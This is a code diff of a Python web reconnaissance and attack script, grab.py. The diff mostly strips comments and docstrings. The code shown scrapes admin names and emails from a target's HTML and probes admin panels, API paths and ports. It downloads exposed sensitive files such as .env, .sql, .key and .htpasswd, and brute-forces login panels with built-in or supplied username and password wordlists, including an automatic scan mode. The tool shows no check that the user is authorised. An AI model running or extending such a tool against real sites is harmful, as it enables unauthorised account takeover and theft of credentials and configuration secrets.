@@ -1,9 +1,4 @@
 #!/usr/bin/env python3
-"""
-Web Reconnaissance Tool - grab.py
-Advanced web security scanner and information gathering tool
-"""
-
 import os
 import sys
 import random
@@ -26,10 +21,6 @@ except ImportError:
     os.system(f"{sys.executable} -m pip install beautifulsoup4 -q")
     from bs4 import BeautifulSoup
 
-# ══════════════════════════════════════════════════════════════════════════════
-# ANSI COLORS
-# ══════════════════════════════════════════════════════════════════════════════
-
 RED = "\033[91m"
 GREEN = "\033[92m"
 YELLOW = "\033[93m"
@@ -41,10 +32,6 @@ BOLD = "\033[1m"
 
 def cprint(msg, color=RESET):
     print(f"{color}{msg}{RESET}")
-
-# ══════════════════════════════════════════════════════════════════════════════
-# CONFIGURATION
-# ══════════════════════════════════════════════════════════════════════════════
 
 DOWNLOAD_ROOT = "/sdcard/Download" if os.path.exists("/sdcard") else os.path.expanduser("~/Downloads/web_recon")
 USER_AGENTS = [
@@ -73,14 +60,12 @@ API_PATHS = [
     "/swagger", "/swagger.json", "/openapi.json", "/docs"
 ]
 
-# Kategori file sensitif
 SENSITIVE_EXTENSIONS = (
     '.sql', '.env', '.log', '.bak', '.zip', '.tar', '.gz', '.rar',
     '.htaccess', '.htpasswd', '.ini', '.conf', '.cfg', '.yml', '.yaml',
     '.xml', '.json', '.db', '.sqlite', '.key', '.pem', '.crt'
 )
 
-# Kategori file berdasarkan tipe
 FRONTEND_EXTENSIONS = ('.js', '.css', '.html', '.htm', '.json', '.map', '.svg', '.png', '.jpg', '.jpeg', '.webp')
 BACKEND_EXTENSIONS = ('.php', '.py', '.pl', '.rb', '.asp', '.aspx', '.jsp', '.java', '.go', '.env', '.log', '.sql')
 CONFIG_EXTENSIONS = ('.env', '.yml', '.yaml', '.ini', '.conf', '.cfg', '.toml', '.properties')
@@ -120,7 +105,6 @@ def get_random_user_agent():
     return random.choice(USER_AGENTS)
 
 def load_wordlist(filepath):
-    """Load wordlist from file"""
     try:
         with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
             return [line.strip() for line in f if line.strip() and not line.startswith('#')]
@@ -128,18 +112,9 @@ def load_wordlist(filepath):
         cprint(f"{RED}❌ Wordlist not found: {filepath}{RESET}", RED)
         return []
 
-# ══════════════════════════════════════════════════════════════════════════════
-# NEW: EXTRACT ADMIN NAMES
-# ══════════════════════════════════════════════════════════════════════════════
-
 def extract_admin_names(html):
-    """
-    Extract potential admin/user names from HTML content
-    Returns a list of cleaned names
-    """
     names = set()
     
-    # 1. From HTML comments
     comments = re.findall(r'<!--.*?-->', html, re.DOTALL)
     for comment in comments:
         matches = re.findall(r'(?:by|author|created|managed|contact|developer)\s*[:\-]?\s*([A-Za-z0-9._-]+)', comment, re.I)
@@ -147,7 +122,6 @@ def extract_admin_names(html):
             if len(m) > 2 and not m.isdigit():
                 names.add(m.lower())
     
-    # 2. From meta tags
     meta_author = re.findall(r'<meta[^>]+name=["\']author["\'][^>]+content=["\']([^"\']+)["\']', html, re.I)
     for author in meta_author:
         if '@' in author:
@@ -157,7 +131,6 @@ def extract_admin_names(html):
         else:
             names.add(author.lower())
     
-    # 3. From common text patterns
     text_patterns = [
         r'Contact:\s*([A-Za-z0-9._-]+)@',
         r'Managed by\s+([A-Za-z]+)',
@@ -171,7 +144,6 @@ def extract_admin_names(html):
             if len(m) > 2 and not m.isdigit():
                 names.add(m.lower())
     
-    # Clean up
     filtered = set()
     for name in names:
         if len(name) < 3 or len(name) > 20:
@@ -183,10 +155,6 @@ def extract_admin_names(html):
         filtered.add(name)
     
     return list(filtered)
-
-# ══════════════════════════════════════════════════════════════════════════════
-# CORE FUNCTIONS (tidak berubah banyak)
-# ══════════════════════════════════════════════════════════════════════════════
 
 def safe_request(method, url, **kwargs):
     if get_request_count() >= MAX_REQUESTS:
@@ -392,14 +360,7 @@ def save_text_report(data, folder):
                     f.write(f"  - {u}:{p}\n")
     cprint(f"  📄 report.txt saved", CYAN)
 
-# ══════════════════════════════════════════════════════════════════════════════
-# NEW: GRAB ALL SENSITIVE FILES (FRONTEND, BACKEND, API, CONFIG)
-# ══════════════════════════════════════════════════════════════════════════════
-
 def categorize_and_download_files(all_links, output_dir):
-    """
-    Categorize files and download them into subfolders
-    """
     frontend_files = []
     backend_files = []
     config_files = []
@@ -407,10 +368,8 @@ def categorize_and_download_files(all_links, output_dir):
 
     for link in all_links:
         path = urlparse(link).path.lower()
-        # API endpoints
         if any(api in path for api in ["/api/", "/graphql", "/swagger", "/openapi", "/rest/"]):
             api_endpoints.append(link)
-        # Files
         elif any(link.lower().endswith(ext) for ext in FRONTEND_EXTENSIONS):
             frontend_files.append(link)
         elif any(link.lower().endswith(ext) for ext in BACKEND_EXTENSIONS):
@@ -450,7 +409,6 @@ def categorize_and_download_files(all_links, output_dir):
             if download_file(url, cat_dir):
                 downloaded += 1
 
-    # Save API endpoints separately
     if api_endpoints:
         api_dir = os.path.join(output_dir, "api")
         os.makedirs(api_dir, exist_ok=True)
@@ -460,10 +418,6 @@ def categorize_and_download_files(all_links, output_dir):
         cprint(f"  📝 api/endpoints.txt saved", CYAN)
 
     return downloaded
-
-# ══════════════════════════════════════════════════════════════════════════════
-# BRUTE FORCE FUNCTIONS (DIPERBARUI)
-# ══════════════════════════════════════════════════════════════════════════════
 
 def brute_force_login_enhanced(url, username_list=None, password_list=None, max_attempts=None):
     usernames = username_list or DEFAULT_USERNAMES
@@ -583,10 +537,6 @@ def brute_force_with_wordlist_custom(url, username_list, password_file=None):
     results = brute_force_login_enhanced(url, usernames, passwords, max_attempts=total_attempts)
     return {url: results} if results else {}
 
-# ══════════════════════════════════════════════════════════════════════════════
-# FULL SCAN (DIPERBARUI)
-# ══════════════════════════════════════════════════════════════════════════════
-
 def full_scan(target_url, username_file=None, password_file=None):
     reset_request_count()
     start_time = time.time()
@@ -607,7 +557,6 @@ def full_scan(target_url, username_file=None, password_file=None):
     main_html = resp.text
     main_headers = dict(resp.headers)
     
-    # EXTRACT ADMIN NAMES
     extracted_names = extract_admin_names(main_html)
     if extracted_names:
         cprint(f"{MAGENTA}👤 Admin names found: {', '.join(extracted_names)}{RESET}", MAGENTA)
@@ -624,10 +573,8 @@ def full_scan(target_url, username_file=None, password_file=None):
     admins.update(found_paths)
     ports = scan_ports(parsed.hostname) if parsed.hostname else {}
     
-    # DOWNLOAD ALL CATEGORIZED FILES
     downloaded = categorize_and_download_files(all_links, output_dir)
     
-    # ENHANCED BRUTE FORCE WITH ADMIN NAMES
     credentials = {}
     if admins:
         cprint(f"\n{RED}🔐 Testing credentials on {len(admins)} panel(s)...{RESET}", RED)
@@ -636,7 +583,6 @@ def full_scan(target_url, username_file=None, password_file=None):
             if get_request_count() >= MAX_REQUESTS:
                 break
             
-            # Build dynamic username list
             dynamic_usernames = DEFAULT_USERNAMES.copy()
             dynamic_usernames.extend(extracted_names)
             for email in emails:
@@ -698,10 +644,6 @@ def full_scan(target_url, username_file=None, password_file=None):
                 
     cprint(f"\n📁 {output_dir}\n", CYAN)
     return report_data
-
-# ══════════════════════════════════════════════════════════════════════════════
-# MODES
-# ══════════════════════════════════════════════════════════════════════════════
 
 def auto_scan(max_attempts=100):
     cprint(f"\n{MAGENTA}🔄 AUTO SCAN{RESET}\n", MAGENTA)
@@ -820,7 +762,6 @@ def main():
                     user_file = input(f"{CYAN}Username wordlist (default: built-in):{RESET} ").strip() or None
                     pass_file = input(f"{CYAN}Password wordlist (default: built-in):{RESET} ").strip() or None
                     
-                    # Try to extract names from target if possible
                     try:
                         resp = safe_request('get', url)
                         if resp:
